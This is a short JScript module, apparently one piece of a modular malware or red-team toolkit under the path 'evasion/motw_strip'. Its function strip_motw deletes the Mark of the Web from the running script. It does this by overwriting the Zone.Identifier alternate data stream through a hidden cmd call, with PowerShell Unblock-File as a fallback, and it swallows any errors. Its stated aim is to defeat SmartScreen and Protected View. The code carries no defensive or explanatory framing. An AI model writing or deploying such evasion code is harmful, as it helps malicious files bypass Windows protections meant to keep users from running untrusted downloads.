// chunk: evasion/motw_strip
// depends: (none)
// provides: strip_motw
// format: jscript
// note: Deletes the Zone.Identifier alternate data stream from the current
//       script file to remove Mark of the Web. Removes SmartScreen and
//       Protected View restrictions on the file.

function strip_motw() {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var scriptPath = WScript.ScriptFullName;
        /* Delete the Zone.Identifier ADS via cmd */
        sh.Run('cmd /c echo. > "' + scriptPath + ':Zone.Identifier"', 0, true);
    } catch(e) {}
    /* Alternative: use PowerShell Unblock-File */
    try {
        var sh2 = new ActiveXObject("WScript.Shell");
        sh2.Run('powershell -c "Unblock-File -Path \'' + WScript.ScriptFullName + '\'"', 0, true);
    } catch(e) {}
}
